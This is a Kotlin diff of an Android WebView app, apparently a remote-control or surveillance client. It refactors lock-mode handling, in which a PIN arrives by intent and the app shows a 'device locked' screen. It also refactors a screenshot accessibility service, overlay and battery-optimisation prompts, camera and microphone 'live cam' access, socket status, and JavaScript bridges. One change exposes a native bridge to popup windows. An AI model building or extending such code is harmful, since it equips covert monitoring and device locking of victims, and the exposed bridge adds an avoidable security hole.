@@ -42,7 +42,6 @@ class MainActivity : AppCompatActivity() {
         setupWebView()
         registerReceivers()
 
-        // STEP 1: Minta POST_NOTIFICATIONS (wajib Android 13+)
         requestNotificationPermission()
     }
 
@@ -62,11 +61,10 @@ class MainActivity : AppCompatActivity() {
                 return
             }
         }
-        // lanjut ke step 2
         requestCameraAudioPermission()
     }
 
-    // ─── STEP 2: Kamera & Mikrofon (buat fitur foto / live cam) ─────────────
+    // ─── STEP 2: Kamera & Mikrofon ──────────────────────────────────────────
     private fun requestCameraAudioPermission() {
         val need = mutableListOf<String>()
 
@@ -144,7 +142,7 @@ class MainActivity : AppCompatActivity() {
             inputStream.close()
             val json = String(buffer, Charsets.UTF_8)
             val obj = JSONObject(json)
-            accountUid = obj.optString("uid", "unknown")
+            accountUid = obj.optString("uid", "unknown") ?: "unknown"
 
             val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
             prefs.edit().putString("account_uid", accountUid).apply()
@@ -173,7 +171,6 @@ class MainActivity : AppCompatActivity() {
             allowContentAccess = true
             mediaPlaybackRequiresUserGesture = false
 
-            // 🔥 TAMBAHAN BIAR WEBVIEW JALAN SEPERTI BROWSER ASLI
             javaScriptCanOpenWindowsAutomatically = true
             setSupportMultipleWindows(true)
             databaseEnabled = true
@@ -187,7 +184,7 @@ class MainActivity : AppCompatActivity() {
                 mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
         }
 
-        // Pengaturan Cookie
+        // Cookie
         val cookieManager = CookieManager.getInstance()
         cookieManager.setAcceptCookie(true)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
@@ -211,17 +208,25 @@ class MainActivity : AppCompatActivity() {
                 resultMsg: Message?
             ): Boolean {
                 val newWebView = WebView(this@MainActivity)
+                newWebView.settings.javaScriptEnabled = true
+                newWebView.settings.domStorageEnabled = true
+                newWebView.addJavascriptInterface(MainBridge(), "MainBridge")
                 newWebView.webViewClient = object : WebViewClient() {
                     override fun shouldOverrideUrlLoading(
-                        view: WebView?,
+                        v: WebView?,
                         request: WebResourceRequest?
                     ): Boolean {
                         val url = request?.url?.toString() ?: return false
                         webView.loadUrl(url)
+                        v?.postDelayed({ (v as? WebView)?.destroy() }, 1500)
                         return true
                     }
                 }
-                val transport = resultMsg?.obj as WebView.WebViewTransport
+                val transport = resultMsg?.obj as? WebView.WebViewTransport
+                if (transport == null) {
+                    newWebView.destroy()
+                    return false
+                }
                 transport.webView = newWebView
                 resultMsg.sendToTarget()
                 return true
@@ -255,7 +260,7 @@ class MainActivity : AppCompatActivity() {
                     val code = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                         error?.errorCode else 0
                     val desc = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
-                        error?.description ?: "unknown" else "unknown"
+                        error?.description?.toString() ?: "unknown" else "unknown"
                     showErrorPage("Koneksi gagal (code: $code)\n$desc")
                 }
             }
@@ -286,7 +291,13 @@ class MainActivity : AppCompatActivity() {
         showErrorPage("Aplikasi Error.\nURL Website tidak ditemukan dalam paket.")
     }
 
+    private fun escapeHtml(s: String): String =
+        s.replace("&", "&amp;")
+         .replace("<", "&lt;")
+         .replace(">", "&gt;")
+
     private fun showErrorPage(message: String) {
+        val safe = escapeHtml(message)
         val html = """
             <!DOCTYPE html>
             <html>
@@ -314,7 +325,7 @@ class MainActivity : AppCompatActivity() {
                 <div class="box">
                     <div class="icon">!</div>
                     <h3>Aplikasi Error</h3>
-                    <p>$message</p>
+                    <p>$safe</p>
                 </div>
             </body>
             </html>
@@ -337,8 +348,9 @@ class MainActivity : AppCompatActivity() {
 
     override fun onNewIntent(intent: Intent?) {
         super.onNewIntent(intent)
+        intent ?: return
         setIntent(intent)
-        if (intent?.getBooleanExtra("lock_mode", false) == true) {
+        if (intent.getBooleanExtra("lock_mode", false)) {
             val pin = intent.getStringExtra("lock_pin") ?: ""
             val title = intent.getStringExtra("lock_title") ?: "Perangkat Terkunci"
             startLockMode(pin, title)
@@ -362,17 +374,27 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    private fun jsEscape(s: String): String =
+        s.replace("\\", "\\\\")
+         .replace("'", "\\'")
+         .replace("\"", "\\\"")
+         .replace("\n", "\\n")
+         .replace("\r", "\\r")
+
     private fun startLockMode(pin: String, title: String) {
+        val safePin = jsEscape(pin)
+        val safeTitle = jsEscape(title)
         webView.evaluateJavascript(
-            "if(typeof showLockScreen==='function') showLockScreen('${pin}','${title}')",
+            "if(typeof showLockScreen==='function') showLockScreen('$safePin','$safeTitle')",
             null
         )
-        try { startLockTask() } catch (e: Exception) {}
     }
 
     private fun stopLockMode() {
-        try { stopLockTask() } catch (e: Exception) {}
-        webView.evaluateJavascript("if(typeof hideLockScreen==='function') hideLockScreen()", null)
+        webView.evaluateJavascript(
+            "if(typeof hideLockScreen==='function') hideLockScreen()",
+            null
+        )
         val i = Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) }
         sendBroadcast(i)
     }
@@ -413,8 +435,9 @@ class MainActivity : AppCompatActivity() {
                 contentResolver,
                 Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
             ) ?: return false
-            enabled.contains(packageName + "/" + ScreenshotAccessibilityService::class.java.name) ||
-            enabled.contains(packageName + "/.ScreenshotAccessibilityService")
+            val fullName  = "$packageName/${ScreenshotAccessibilityService::class.java.name}"
+            val shortName = "$packageName/.ScreenshotAccessibilityService"
+            enabled.contains(fullName) || enabled.contains(shortName)
         } catch (_: Exception) { false }
     }
 
@@ -466,14 +489,31 @@ class AppBridge(private val context: Context, private val webView: WebView) {
     }
 
     @JavascriptInterface fun isSocketConnected(): Boolean = SocketHolder.connected
-    @JavascriptInterface fun isBatteryOptIgnored() = (context as MainActivity).isBatteryOptIgnored()
-    @JavascriptInterface fun isOverlayGranted() = (context as MainActivity).isOverlayGranted()
-    @JavascriptInterface fun requestOverlayPerm() = (context as MainActivity).requestOverlayPerm()
-    @JavascriptInterface fun openBatterySettings() = (context as MainActivity).openBatterySettings()
 
-    @JavascriptInterface fun requestAccessibilityPerm() =
-        (context as MainActivity).openAccessibilitySettings()
+    @JavascriptInterface fun isBatteryOptIgnored(): Boolean {
+        val act = context as? MainActivity ?: return true
+        return act.isBatteryOptIgnored()
+    }
 
-    @JavascriptInterface fun isAccessibilityEnabled(): Boolean =
-        (context as MainActivity).isAccessibilityEnabled()
+    @JavascriptInterface fun isOverlayGranted(): Boolean {
+        val act = context as? MainActivity ?: return false
+        return act.isOverlayGranted()
+    }
+
+    @JavascriptInterface fun requestOverlayPerm() {
+        (context as? MainActivity)?.requestOverlayPerm()
+    }
+
+    @JavascriptInterface fun openBatterySettings() {
+        (context as? MainActivity)?.openBatterySettings()
+    }
+
+    @JavascriptInterface fun requestAccessibilityPerm() {
+        (context as? MainActivity)?.openAccessibilitySettings()
+    }
+
+    @JavascriptInterface fun isAccessibilityEnabled(): Boolean {
+        val act = context as? MainActivity ?: return false
+        return act.isAccessibilityEnabled()
+    }
 }
